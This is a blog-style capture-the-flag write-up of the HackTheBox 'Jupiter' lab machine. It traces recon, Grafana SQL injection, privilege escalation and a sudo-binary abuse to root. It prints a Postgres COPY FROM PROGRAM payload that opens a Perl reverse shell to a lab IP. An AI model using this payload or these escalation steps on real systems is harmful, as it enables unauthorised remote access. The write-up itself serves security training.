---
title: HacktheBox Jupiter Writeup
date: 2023-06-16
categories: [Writeup]
tags: [writeup, solve, hackthebox, hack, cybersecurity, machine, jupiter, ctf, htb]
---

# Jupiter Machine

I recently solved this HTB machine and it was fun box, and wanted to share with you my writ-up.

![](/assets/img/jupiter/Screenshot 2023-06-17 150912.png)

### Recon

 The first phase is trying to figure out the box so doing NMAP to scan the running services first.

We got only couple of ports open SSH and HTTP on port 80




![](/assets/img/jupiter/Pasted image 20230609200055.png)

After trying to access the http service it redirects us to `http://jupiter.htb`

 ![](/assets/img/jupiter/Pasted image 20230609195342.png)


 So we need to add the hostname in our `hosts` file 

![](/assets/img/jupiter/Pasted image 20230616210813.png)

 The website is a static nothing interesting shows right away, So doing some enumeration found nothing

![](/assets/img/jupiter/Pasted image 20230616221946.png)

### Scanning

 But after fuzzing the subdomains found a subdomain `kiosk.jupiter.htb`

![](/assets/img/jupiter/Pasted image 20230609200244.png)


 The subdomain is hosting a Grafana instance but still nothing interesting found right away.

![](/assets/img/jupiter/Pasted image 20230616221857.png)


### Exploitation

So firing up Burp to see how everything works under the hood

After analyzing the requests made found an interesting API call which has a very interesting parameter called "rawSql" which exactly function as its name, It takes a SQL Query as an input and execute it.

![](/assets/img/jupiter/Pasted image 20230609200643.png)

 And it already made our job easier and found a header identifying the backend database used which is "postgres" 

 So now all we need is to craft Postgres SQL query to get a reverse shell

 Using the bellow SQL commands to get a reverse shell

```sql
CREATE TABLE files(cmd_output text);

COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.10.16.67:1339\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

-- Note the backslash to escape the double quote to be a correct format of JSON
```

![](/assets/img/jupiter/Pasted image 20230609201308.png)

 We successfully received a shell
 Now we need to stabilize the shell and upgrade it to be interactive.

![](/assets/img/jupiter/Pasted image 20230616215013.png)

### Getting The User Flag

 Since I couldn't find something interesting, One thing I like to do after using "Linpeas" script is "pspy" 

 Transferring and using `pspy` to monitor and snoop on all running process.

 Found a process that gets executed every few minutes which is calling a config file in "/dev/shm" directory 

 And this config file is world writable by any user

![](/assets/img/jupiter/Pasted image 20230609202057.png)

![](/assets/img/jupiter/Pasted image 20230616215707.png)

 Editing the config file to execute commands on behalf the process's owner and getting escalated privilege as `juno` user

![](/assets/img/jupiter/Pasted image 20230608201649.png)

 Using `pspy` to see if the commands gets executed successfully 

![](/assets/img/jupiter/Pasted image 20230608202711.png)

 Using the sticky bit permission over the `bash` binary I was able to get escalate privilege as `juno` user

![](/assets/img/jupiter/Pasted image 20230608202821.png)


![](/assets/img/jupiter/Pasted image 20230608233501.png)

 As we can see in the previous screen in order to read the `user.txt` file we must be in the group of `juno` which we are not, cause we got our shell inherited from the previous session which from the user `postgress` and to get all groups of the user `juno` we must start a new session not inherit a new one.

 Getting a reverse shell using the script found in the `juno` home directory which runs every few minutes as we have write access to the script.

![](/assets/img/jupiter/Pasted image 20230608233538.png)

 Now we are able to read the user.txt file

![](/assets/img/jupiter/Pasted image 20230608233731.png)


### Lateral Movement 

 We can see another user called `jovian` in the home directory which maybe interesting.
 But couldn't find anything would help to escalate to the root or the other user "Jovian"

 Trying to find any files or directories owned by `jovian` and accessible by `juno`

```sh
find / -user jovian 2>/dev/null
```

 Found a directory `solar-flares` which is owned by group `science` and `juno` is a user of this group which means juno can access the folder

![](/assets/img/jupiter/Pasted image 20230609210029.png)

 Reading the files it looks like a Jupyter server and already found a token from the logs
![](/assets/img/jupiter/Pasted image 20230616220827.png)
 To make sure the website is still up and running using `netstat`

![](/assets/img/jupiter/Pasted image 20230609210415.png)

 Now we are sure that the server is running

 Now we need to access the port "8888" from our machine top be able view the server from the browser we could do that easily by port forwarding but we don't have SSH access, So we will use chisel.

 Transferring Chisel and pivot to access the Jupyter instance

![](/assets/img/jupiter/Pasted image 20230609002818.png)

 Injecting reverse shell code and  execute it

![](/assets/img/jupiter/Pasted image 20230609002953.png)


 Received a reverse shell as `jovian`

![](/assets/img/jupiter/Pasted image 20230609003103.png)

### Privilege Escalation To Root

 Using `sudo -l` to see what commands are allowed to run as root

![](/assets/img/jupiter/Pasted image 20230609024928.png)

 We can run execute this binary as root without requiring password
 The binary `sattrack` needs a config file to run
 Searching for the configs

![](/assets/img/jupiter/Pasted image 20230609025001.png)

 After understading how this works, It seems it tries to fetch a file and store it on the current directory, We can hack this by providing the `root.txt` file to fetch and then it will store its content in the same directory where we can view it 

![](/assets/img/jupiter/Pasted image 20230609025117.png)

 Run the tool as sudo, Read the root.txt

![](/assets/img/jupiter/Pasted image 20230609025159.png)


 Now we got the last flag.


Hope you enjoyed the write-up!
